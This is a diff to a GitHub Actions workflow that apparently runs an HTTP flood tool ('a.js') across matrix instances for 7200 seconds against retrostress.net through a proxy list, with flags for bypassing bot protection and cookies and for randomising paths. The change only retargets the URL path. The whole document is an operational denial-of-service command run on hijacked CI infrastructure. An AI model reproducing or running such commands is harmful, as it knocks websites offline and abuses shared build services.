@@ -32,4 +32,4 @@ jobs:
     
     - name: Run a.js (Instance ${{ matrix.instance }})
       run: |
-        node a.js GET  https://retrostress.net/ 7200 1 1 proxy.txt  --bfm --auth --debug --cookie "bypass=%RAND%" --randpath 1 --delay 3 
+        node a.js GET  https://retrostress.net/uwuw 7200 1 1 proxy.txt  --bfm --auth --debug --cookie "bypass=%RAND%" --randpath 1 --delay 3 
